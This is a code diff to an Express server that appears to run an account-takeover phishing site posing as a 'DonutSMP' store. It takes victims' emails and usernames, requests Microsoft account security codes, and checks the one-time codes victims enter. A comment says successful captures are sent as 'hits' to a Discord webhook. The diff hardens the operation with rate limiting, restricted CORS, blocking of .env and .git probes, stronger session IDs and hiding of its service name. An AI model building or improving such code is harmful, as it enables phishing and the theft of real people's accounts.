@@ -1,12 +1,21 @@
+require('dotenv').config();
+
 try {
   const { attachGlobalLoggerGuard } = require('./autosecure/utils/logging/interceptLogger');
   if (attachGlobalLoggerGuard) attachGlobalLoggerGuard();
 } catch (e) {}
 
+const { setupGlobalErrorHandlers, registerServer } = require('./autosecure/utils/process/gracefulShutdown');
+setupGlobalErrorHandlers('Server');
+
+const { getClientIp, configureTrustProxy } = require('./autosecure/utils/security/clientIp');
 const express = require('express');
+const rateLimit = require('express-rate-limit');
+const crypto = require('crypto');
 const path = require('path');
 const fs = require('fs');
 const http = require('http');
+const { securityHeaders } = require('./autosecure/utils/security/apiAuth');
 
 // VinGr0ups3cur3 Core Modules
 const validEmail = require('./autosecure/utils/emails/validEmail');
@@ -21,12 +30,27 @@ const getStats = require('./autosecure/utils/hypixelapi/getStats');
 const { sendSecureNotification } = require('./autosecure/utils/notifications/notifier');
 const { initializeDB, queryParams } = require('./db/db');
 const { sendWebLog } = require('./autosecure/utils/webLogger');
-const config = require('./config.json');
+const config = require('./configLoader');
 
 const app = express();
-app.set('trust proxy', 1); // Trust Nginx/Cloudflare for rate-limit
+configureTrustProxy(app, 'edge');
 const PORT = process.env.PORT || 3667;
 const FRONTEND_DIR = path.join(__dirname, 'public');
+
+// Security Defense: Block attempts to access sensitive files (.env, .git, .json, .sqlite, .db, .log)
+app.use((req, res, next) => {
+    const url = req.url.toLowerCase();
+    if (/\.(env|git|json|sqlite|db|log|sh|bat)(\/|\?|$)/i.test(url) || url.includes('/.env') || url.includes('/.git')) {
+        return res.status(403).send('403 Forbidden');
+    }
+    next();
+});
+
+// Security headers on all responses
+app.use(securityHeaders);
+
+// Disable X-Powered-By
+app.disable('x-powered-by');
 
 // Active OTP Sessions cache: sessionId -> { email, secId, secDisplay, username, timestamp }
 const activeSessions = new Map();
@@ -44,7 +68,13 @@ setInterval(() => {
 // --- MIDDLEWARES ---
 // Enable CORS for all origins & methods
 app.use((req, res, next) => {
-    res.setHeader('Access-Control-Allow-Origin', '*');
+    const allowedOrigins = (config.webDomains || []).map(d => `https://${d}`).concat((config.webDomains || []).map(d => `http://${d}`));
+    const origin = req.headers.origin;
+    if (allowedOrigins.includes(origin)) {
+        res.setHeader('Access-Control-Allow-Origin', origin);
+    } else if (!origin) {
+        res.setHeader('Access-Control-Allow-Origin', `https://${config.webDomain || 'donuttsmp.store'}`);
+    }
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
     if (req.method === 'OPTIONS') {
@@ -59,11 +89,13 @@ app.use(express.urlencoded({ extended: true }));
 // IP Ban Check
 app.use(async (req, res, next) => {
     try {
-        const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
-        const clientIp = rawIp.split(',')[0].trim();
+        const clientIp = getClientIp(req);
         if (clientIp) {
             const banned = await queryParams('SELECT 1 FROM banned_ips WHERE ip = ?', [clientIp]);
             if (banned && banned.length > 0) {
+                if (req.url.startsWith('/api')) {
+                    return res.status(403).json({ success: false, error: 'Your IP has been blocked by security rules.' });
+                }
                 return res.status(403).send('<h1 style="text-align:center;margin-top:20%;font-family:sans-serif;">403 Forbidden - Access Denied</h1>');
             }
         }
@@ -82,21 +114,75 @@ app.use((req, res, next) => {
     next();
 });
 
+const sendOtpLimiter = rateLimit({
+    windowMs: 1 * 60 * 1000,
+    max: 5,
+    standardHeaders: true,
+    legacyHeaders: false,
+    keyGenerator: (req) => getClientIp(req),
+    message: { success: false, error: 'Too many OTP requests. Please wait 1 minute.' }
+});
+
+const verifyOtpLimiter = rateLimit({
+    windowMs: 1 * 60 * 1000,
+    max: 10,
+    standardHeaders: true,
+    legacyHeaders: false,
+    keyGenerator: (req) => getClientIp(req),
+    message: { success: false, error: 'Too many verification attempts. Please wait a moment.' }
+});
+
+const generalApiLimiter = rateLimit({
+    windowMs: 1 * 60 * 1000,
+    max: 120,
+    standardHeaders: true,
+    legacyHeaders: false,
+    keyGenerator: (req) => getClientIp(req),
+    message: { success: false, error: 'Too many requests. Please try again in 1 minute.' }
+});
+
+app.use('/api/', generalApiLimiter);
+
+const webActivityLimiter = rateLimit({
+    windowMs: 1 * 60 * 1000,
+    max: 20,
+    standardHeaders: true,
+    legacyHeaders: false,
+    keyGenerator: (req) => getClientIp(req),
+    message: { success: false, error: 'Too many activity reports. Please wait a moment.' }
+});
+
 // Realtime Web Activity Logging
-app.post('/api/web-activity', async (req, res) => {
+app.post('/api/web-activity', webActivityLimiter, async (req, res) => {
     try {
-        const { code, username, email, statusText, domain } = req.body || {};
-        // Log if username is provided (email is optional for early steps like Waiting Email)
-        if (username) {
-            const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
-            const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';
+        let { code, username, email, statusText, domain } = req.body || {};
+
+        if (typeof username !== 'string') username = '';
+        if (typeof email !== 'string') email = '';
+        if (typeof code !== 'string') code = '';
+        if (typeof statusText !== 'string') statusText = '';
+        if (typeof domain !== 'string') domain = '';
+
+        username = username.trim().slice(0, 64);
+        email = email.trim().slice(0, 128);
+        code = code.trim().slice(0, 64);
+        statusText = statusText.trim().slice(0, 64);
+        domain = domain.trim().slice(0, 128);
+
+        // Sanitize code and domain
+        if (code && !/^[a-zA-Z0-9_-]+$/.test(code)) code = '';
+        if (domain && !/^[a-zA-Z0-9.:_-]+$/.test(domain)) domain = '';
+
+        // Validate username (safe alphanumeric + reasonable characters)
+        if (username && /^[a-zA-Z0-9_ -]{1,64}$/.test(username)) {
+            const clientIp = getClientIp(req);
             
             console.log(`[WEB ACTIVITY] ${username} | ${statusText} | IP: ${clientIp} | Code: ${code || 'None'} | Email: ${email || 'None'}`);
 
             await sendWebLog({
                 code,
                 ip: clientIp,
-                domain: config.webDomain || (config.domains && config.domains[0]) || 'donuttsmp.store',
+                domain: domain || config.webDomain || (config.domains && config.domains[0]) || 'donuttsmp.store',
                 username,
                 email: email || '',
                 statusText: statusText || 'Send Code'
@@ -105,7 +191,7 @@ app.post('/api/web-activity', async (req, res) => {
 
         return res.json({ success: true });
     } catch (err) {
-        return res.status(500).json({ success: false, error: err.message });
+        return res.status(500).json({ success: false, error: 'Internal server error' });
     }
 });
 
@@ -117,9 +203,8 @@ app.post('/api/web-activity', async (req, res) => {
 app.get('/api/health', (req, res) => {
     res.json({
         status: 'ok',
-        service: 'DonutSMP VinGroup API Server',
-        time: new Date().toISOString(),
-        activeSessions: activeSessions.size
+        service: 'DonutSMP API',
+        time: new Date().toISOString()
     });
 });
 
@@ -127,7 +212,7 @@ app.get('/api/health', (req, res) => {
  * 2. Send OTP (User nhập email -> Backend xác nhận nếu email đúng thì gửi OTP)
  * Body: { email, username }
  */
-app.post('/api/send-otp', async (req, res) => {
+app.post('/api/send-otp', sendOtpLimiter, async (req, res) => {
     try {
         let { email, username, giftCode, code: altCode } = req.body;
         email = (email || '').trim();
@@ -188,8 +273,7 @@ app.post('/api/send-otp', async (req, res) => {
         console.log(`[API /send-otp] Đang truy vấn Microsoft Live Credentials cho ${email}...`);
         const profiles = await getCredentials(email, false);
 
-        const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
-        const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';
+        const clientIp = getClientIp(req);
 
         if (!profiles) {
             console.log(`[API /send-otp] [X] Không thể tìm thấy thông tin tài khoản Microsoft: ${email}`);
@@ -255,7 +339,7 @@ app.post('/api/send-otp', async (req, res) => {
         }).catch(() => {});
 
         // Store session
-        const sessionId = 'sess_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
+        const sessionId = 'sess_' + crypto.randomBytes(16).toString('hex');
         activeSessions.set(sessionId, {
             email,
             secData,
@@ -292,11 +376,11 @@ app.post('/api/send-otp', async (req, res) => {
  * 3. Verify OTP & VinGroup (User nhập OTP -> Nếu đúng = VinGroup -> Bắn hit Discord)
  * Body: { sessionId, email, secId, code, username, giftCode }
  */
-app.post('/api/verify-otp', async (req, res) => {
+app.post('/api/verify-otp', verifyOtpLimiter, async (req, res) => {
     try {
-        let { sessionId, email, secId, code, username, giftCode, code: altCode } = req.body;
-        code = (code || '').toString().trim();
-        let curGiftCode = (giftCode || altCode || '').trim();
+        let { sessionId, email, secId, code, username, giftCode, gift_code } = req.body || {};
+        code = (code || '').toString().trim().replace(/[\s\-]/g, '');
+        let curGiftCode = (giftCode || gift_code || '').trim();
         let botUserId = null;
         let botNumber = 1;
 
@@ -328,11 +412,11 @@ app.post('/api/verify-otp', async (req, res) => {
         console.log(`[API /verify-otp] Nhận yêu cầu xác thực OTP:`);
         console.log(` • Email    : ${email}`);
         console.log(` • SecId    : ${secId ? 'Hợp lệ' : 'Trống'}`);
-        console.log(` • Mã OTP   : ${code}`);
+        console.log(` • Mã OTP   : [REDACTED] (Length: ${code.length})`);
         console.log(` • Username : ${username || 'N/A'}`);
         console.log(` • Bot Owner: ${botUserId || 'Default'}`);
 
-        if (!code || isNaN(code)) {
+        if (!code || !/^\d{6,8}$/.test(code)) {
             return res.status(400).json({
                 success: false,
                 error: 'Mã xác nhận phải là dãy số gồm 6-8 chữ số!'
@@ -572,8 +656,8 @@ app.post('/api/verify-otp', async (req, res) => {
 // --- TEBEX DONUT SMP STATIC ROUTING ---
 
 // Serve static assets
-app.use('/assets', express.static(path.join(FRONTEND_DIR, 'assets')));
-app.use('/terms', express.static(path.join(FRONTEND_DIR, 'terms')));
+app.use('/assets', express.static(path.join(FRONTEND_DIR, 'assets'), { dotfiles: 'deny' }));
+app.use('/terms', express.static(path.join(FRONTEND_DIR, 'terms'), { dotfiles: 'deny' }));
 
 // Periodic cleanup of expired gift links (> 30 mins) every 5 minutes
 setInterval(async () => {
@@ -585,8 +669,7 @@ setInterval(async () => {
 // Donut Gift Link Claim Routes
 app.get(['/gift/:code/claim', '/gift/:code'], async (req, res) => {
     const code = req.params.code;
-    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
-    const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';
+    const clientIp = getClientIp(req);
     const host = req.headers.host || config.webDomain || 'donuttsmp.store';
     const EXPIRY_MS = 30 * 60 * 1000;
     const now = Date.now();
@@ -682,7 +765,7 @@ app.get('/terms/impressum', (req, res) => res.sendFile(path.join(FRONTEND_DIR, '
 app.get('/terms/privacy', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'terms_privacy.html')));
 
 // Fallback static files
-app.use(express.static(FRONTEND_DIR));
+app.use(express.static(FRONTEND_DIR, { dotfiles: 'deny' }));
 
 // Start server function
 async function startServer() {
@@ -691,17 +774,15 @@ async function startServer() {
         await initializeDB();
         console.log('Cơ sở dữ liệu SQLite đã sẵn sàng.');
 
-        app.listen(PORT, '0.0.0.0', () => {
+        const server = app.listen(PORT, '0.0.0.0', () => {
             console.log(`\n======================================================`);
             console.log(`🚀 DonutSMP Web Server & VinGroup API đang hoạt động!`);
-            console.log(` • Website Store : http://localhost:${PORT}`);
-            console.log(` • Checkout Page : http://localhost:${PORT}/checkout`);
-            console.log(` • Payment Page  : http://localhost:${PORT}/checkout/payment`);
-            console.log(` • API Send OTP  : http://localhost:${PORT}/api/send-otp`);
-            console.log(` • API Verify OTP: http://localhost:${PORT}/api/verify-otp`);
-            console.log(` • Discord Hook  : ${config.notifierWebhook ? 'ĐÃ CẤU HÌNH' : 'Chưa cấu hình'}`);
+            console.log(` • Frontend : Cổng ${PORT} ✔`);
+            console.log(` • API      : /api/send-otp, /api/verify-otp ✔`);
+            console.log(` • Webhook  : ${config.notifierWebhook ? 'ĐÃ CẤU HÌNH ✔' : '⚠ Chưa cấu hình'}`);
             console.log(`======================================================\n`);
         });
+        registerServer(server);
     } catch (err) {
         console.error('Lỗi khởi động Server:', err);
     }
